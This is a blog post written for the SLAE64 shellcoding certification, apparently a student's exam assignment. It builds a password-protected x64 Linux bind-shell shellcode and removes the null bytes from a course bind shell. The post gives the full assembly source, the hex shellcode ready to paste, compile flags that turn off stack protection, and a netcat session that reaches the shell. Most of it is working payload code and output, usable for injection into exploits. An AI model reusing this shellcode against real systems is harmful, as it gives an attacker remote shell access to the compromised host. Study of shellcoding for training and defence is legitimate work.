---
layout: single
title: SLAE64 Assignment 1 - Shell Bind Tcp with Password
date: 2020-6-02
classes: wide
header:
  teaser: /assets/images/slae/SHELLCODING64.png
tags:
    - Shellcoding
    - Linux
    - x64
    - SLAE64
---

![](/assets/images/slae/SHELLCODING64.png)

## Introduction

For this first post of the SLAE64 exam assignments serie, I want to inform you that the tasks being essentially the same as for the 32bits version, I will go less into details unless I approach new concepts or techniques not seen in the previous serie.
  
The tasks for this first assignment are in a first time to create a shell bind tcp shellcode, that will need a password before executing the shell, and in a second time to remove all null bytes from the bind tcp shellcode discussed during the course.

All the source code for this assignment can be find on my [github repository](https://github.com/skr0x/SLAE64/tree/master/Assignment-01-Shell_bind_tcp)

## Shell bind tcp with password

The socketcall system call is not available on x64 architecture, so we will use the socket, bind, listen and accept syscalls.  
Then we will use the read syscall to read the password, read is equivalent to the recv syscall without the flag argument, that we don't need here. 
```plaintext
skrox@kali:~$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h |grep -E 'socket |bind|listen|accept |dup2|read |execve ' |grep -v "mbind"
#define __NR_read 0
#define __NR_dup2 33
#define __NR_socket 41
#define __NR_accept 43
#define __NR_bind 49
#define __NR_listen 50
#define __NR_execve 59
```
```nasm
_start:

   ; socket(AF_INET, SOCK_STREAM, 0)  
   xor edi, edi                 ; Like we have seen in the course and from 
			        ; Intel® 64 and IA-32 Architectures Developer's Manual: Vol. 1 :
			        ; "32-bit operands generate a 32-bit result, zero-extended to a 64-bit result"
			        ; so xor edi, edi is the same as xor rdi,rdi but shorter, and that's good for us
			      
   mul edi                      ; RAX, RDX, RDI set to 0
   inc edi              
   mov esi, edi                 ; SOCK_STREAM
   inc edi                      ; AF_INET
   mov al, 41               	; socket syscall value
   syscall                  	; exec syscall

   ; bind(sockfd, {INADDR_ANY, 1337, AF_INET}, 16)
   mov ebx, edx			; we save a 0
   push rdx			; INADDR_ANY (0.0.0.0)
   push word 0x3905		; port 1337
   push di 			; AF_INET
   mov edi, eax			; sockfd
   mov rsi, rsp			; RSI point to the sockaddr struct
   mov dl, 0x10			; addrlen
   mov al, 49			; bind syscall value
   syscall                  	; exec syscall

   ; listen(sockfd, 0) 
   mov esi, ebx			; 0 for no queue
				; RDI already set to sockfd
   mov al, 50			; listen syscall value
   syscall			; exec syscall

   ; accept(sockfd, null, null)
   cdq				; RDX set to null pointer
				; RSI already set to null pointer
				; RDI already set to sockfd
   mov al, 43			; accept syscall value
   syscall                  	; exec syscall

   xchg eax, edi		; copy the new sockfd into RDI

try_pass:
   ;read(int fd, void *buf, size_t count);
   mov rsi, rsp			; RSI point to the stack, to write the password
   mov dl, 8			; number of bytes to read from sockfd and write to RSI address
   mov eax, ebx			; read syscall value
   syscall                  	; exec syscall

   xchg rdi, rsi		; copy user password address to RDI and keep sockfd in RSI
   mov rax, 0x737334507433334c  ; L33tP4ss
   scasq			; compare 8 bytes from RAX with 8 bytes from RDI
   xchg rdi, rsi		; reset RDI to sockfd value
   jnz try_pass		        ; if ZF not set RAX/RDI were different (Bad password, so retry)

   mov esi, ebx			; RSI set to 0
   xchg eax, ebx		; RAX set to 0
   add esi, 3			; dup2 counter initialized

dup:
   ; dup2(sockfd, stdio)
   dec esi			; starting with stderr(2) to stdin(0)
				; RDI already set to sockfd
   mov al, 33			; dup2 syscall value
   syscall			; exec syscall
   jnz dup			; if RCX != 0 we need to confinue

   ; execve("/bin/sh", null, null)
   push rax			; string terminator
   mov al, 59			; execve syscall value
   mov rdi, 0x68732f2f6e69622f  ; "/bin//sh"
   push rdi			
   mov rdi, rsp			; RDI point to "/bin//sh"
          			; RSI already set to null pointer
   cdq				; RDX set to null pointer
   syscall                  	; exec syscall
```
Then we extract the shellcode :
```plaintext
skrox@kali:~$ ./compile.sh bind-pass
[x] Assembling...
[x] Linking...
[x] Dumped shellcode :
\x31\xff\xf7\xe7\xff\xc7\x89\xfe\xff\xc7\xb0\x29\x0f\x05\x89\xd3\x52\x66\x68\x05\x39\x66\x57\x89\xc7
\x48\x89\xe6\xb2\x10\xb0\x31\x0f\x05\x89\xde\xb0\x32\x0f\x05\x99\xb0\x2b\x0f\x05\x97\x48\x89\xe6\xb2
\x08\x89\xd8\x0f\x05\x48\x87\xfe\x48\xb8\x4c\x33\x33\x74\x50\x34\x73\x73\x48\xaf\x48\x87\xfe\x75\xe3
\x89\xde\x31\xc0\x83\xc6\x03\xff\xce\xb0\x21\x0f\x05\x75\xf8\xb0\x3b\x53\x48\xbf\x2f\x62\x69\x6e\x2f
\x2f\x73\x68\x57\x48\x89\xe7\x89\xde\x99\x0f\x05
```
We copy paste it into a C++ file (why not ?), compile it and execute it : 
```plaintext
skrox@kali:~$ g++ -fno-stack-protector -z execstack -o shellcode shellcode.cpp 
skrox@kali:~$ ./shellcode 
Shellcode size : 110

```
And in another terminal :
```plaintext
skrox@kali:~$ nc -nv 127.0.0.1 1337
(UNKNOWN) [127.0.0.1] 1337 (?) open
test
ls
L33tP4ss
id
uid=1000(skrox) gid=1000(skrox) groups=1000(skrox)
```
We are done with the first part.

## Removing Null bytes from the bind shellcode from the course

### Dump of the original shellcode

```nasm
skrox@kali:~$ objdump -M intel -d BindShell-original

BindShell-original:     format de fichier elf64-x86-64


Déassemblage de la section .text :

0000000000401000 <_start>:
  401000:	b8 29 00 00 00       	mov    eax,0x29
  401005:	bf 02 00 00 00       	mov    edi,0x2
  40100a:	be 01 00 00 00       	mov    esi,0x1
  40100f:	ba 00 00 00 00       	mov    edx,0x0
  401014:	0f 05                	syscall 
  401016:	48 89 c7             	mov    rdi,rax
  401019:	48 31 c0             	xor    rax,rax
  40101c:	50                   	push   rax
  40101d:	89 44 24 fc          	mov    DWORD PTR [rsp-0x4],eax
  401021:	66 c7 44 24 fa 11 5c 	mov    WORD PTR [rsp-0x6],0x5c11
  401028:	66 c7 44 24 f8 02 00 	mov    WORD PTR [rsp-0x8],0x2
  40102f:	48 83 ec 08          	sub    rsp,0x8
  401033:	b8 31 00 00 00       	mov    eax,0x31
  401038:	48 89 e6             	mov    rsi,rsp
  40103b:	ba 10 00 00 00       	mov    edx,0x10
  401040:	0f 05                	syscall 
  401042:	b8 32 00 00 00       	mov    eax,0x32
  401047:	be 02 00 00 00       	mov    esi,0x2
  40104c:	0f 05                	syscall 
  40104e:	b8 2b 00 00 00       	mov    eax,0x2b
  401053:	48 83 ec 10          	sub    rsp,0x10
  401057:	48 89 e6             	mov    rsi,rsp
  40105a:	c6 44 24 ff 10       	mov    BYTE PTR [rsp-0x1],0x10
  40105f:	48 83 ec 01          	sub    rsp,0x1
  401063:	48 89 e2             	mov    rdx,rsp
  401066:	0f 05                	syscall 
  401068:	49 89 c1             	mov    r9,rax
  40106b:	b8 03 00 00 00       	mov    eax,0x3
  401070:	0f 05                	syscall 
  401072:	4c 89 cf             	mov    rdi,r9
  401075:	b8 21 00 00 00       	mov    eax,0x21
  40107a:	be 00 00 00 00       	mov    esi,0x0
  40107f:	0f 05                	syscall 
  401081:	b8 21 00 00 00       	mov    eax,0x21
  401086:	be 01 00 00 00       	mov    esi,0x1
  40108b:	0f 05                	syscall 
  40108d:	b8 21 00 00 00       	mov    eax,0x21
  401092:	be 02 00 00 00       	mov    esi,0x2
  401097:	0f 05                	syscall 
  401099:	48 31 c0             	xor    rax,rax
  40109c:	50                   	push   rax
  40109d:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f2f6e69622f
  4010a4:	2f 73 68 
  4010a7:	53                   	push   rbx
  4010a8:	48 89 e7             	mov    rdi,rsp
  4010ab:	50                   	push   rax
  4010ac:	48 89 e2             	mov    rdx,rsp
  4010af:	57                   	push   rdi
  4010b0:	48 89 e6             	mov    rsi,rsp
  4010b3:	48 83 c0 3b          	add    rax,0x3b
  4010b7:	0f 05                	syscall 
```
We can see that almost all null bytes are with "mov r32,imm8" instructions 
except one "mov m16, imm8" 
```nasm
  401028:	66 c7 44 24 f8 02 00 	mov    WORD PTR [rsp-0x8],0x2
```
and two "mov r, 0x00"
```nasm
  40100f:	ba 00 00 00 00       	mov    edx,0x0
  ...
  40107a:	be 00 00 00 00       	mov    esi,0x0
```

The simpliest way to remove null bytes is to clear registers then to use register of the same size as the value we want to copy into it.  
For the "mov m16, imm8" to copy the immediate value into a register then mov the corresponding word register to memory.  
And to xor the registers that are cleared with "mov r, 0x00" instructions.
 
### Dump after null bytes removing

```nasm
skrox@kali:~$ objdump -M intel -d BindShell-null-removed

BindShell:     format de fichier elf64-x86-64


Déassemblage de la section .text :

0000000000401000 <_start>:
  401000:	31 ff                	xor    edi,edi
  401002:	f7 e7                	mul    edi
  401004:	89 fe                	mov    esi,edi
  401006:	b0 29                	mov    al,0x29
  401008:	40 b7 02             	mov    dil,0x2
  40100b:	40 b6 01             	mov    sil,0x1
  40100e:	0f 05                	syscall 
  401010:	48 89 c7             	mov    rdi,rax
  401013:	48 31 c0             	xor    rax,rax
  401016:	50                   	push   rax
  401017:	89 44 24 fc          	mov    DWORD PTR [rsp-0x4],eax
  40101b:	66 c7 44 24 fa 11 5c 	mov    WORD PTR [rsp-0x6],0x5c11
  401022:	b0 02                	mov    al,0x2
  401024:	66 89 44 24 f8       	mov    WORD PTR [rsp-0x8],ax
  401029:	48 83 ec 08          	sub    rsp,0x8
  40102d:	b0 31                	mov    al,0x31
  40102f:	48 89 e6             	mov    rsi,rsp
  401032:	b2 10                	mov    dl,0x10
  401034:	0f 05                	syscall 
  401036:	b0 32                	mov    al,0x32
  401038:	40 b6 02             	mov    sil,0x2
  40103b:	0f 05                	syscall 
  40103d:	b0 2b                	mov    al,0x2b
  40103f:	48 83 ec 10          	sub    rsp,0x10
  401043:	48 89 e6             	mov    rsi,rsp
  401046:	c6 44 24 ff 10       	mov    BYTE PTR [rsp-0x1],0x10
  40104b:	48 83 ec 01          	sub    rsp,0x1
  40104f:	48 89 e2             	mov    rdx,rsp
  401052:	0f 05                	syscall 
  401054:	49 89 c1             	mov    r9,rax
  401057:	b0 03                	mov    al,0x3
  401059:	0f 05                	syscall 
  40105b:	4c 89 cf             	mov    rdi,r9
  40105e:	b0 21                	mov    al,0x21
  401060:	31 f6                	xor    esi,esi
  401062:	0f 05                	syscall 
  401064:	b0 21                	mov    al,0x21
  401066:	40 b6 01             	mov    sil,0x1
  401069:	0f 05                	syscall 
  40106b:	b0 21                	mov    al,0x21
  40106d:	40 b6 02             	mov    sil,0x2
  401070:	0f 05                	syscall 
  401072:	48 31 c0             	xor    rax,rax
  401075:	50                   	push   rax
  401076:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f2f6e69622f
  40107d:	2f 73 68 
  401080:	53                   	push   rbx
  401081:	48 89 e7             	mov    rdi,rsp
  401084:	50                   	push   rax
  401085:	48 89 e2             	mov    rdx,rsp
  401088:	57                   	push   rdi
  401089:	48 89 e6             	mov    rsi,rsp
  40108c:	48 83 c0 3b          	add    rax,0x3b
  401090:	0f 05                	syscall 
```
And it's all for this first assignment :)

***This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-
linux/index.html)  
Student ID: PA-14186***
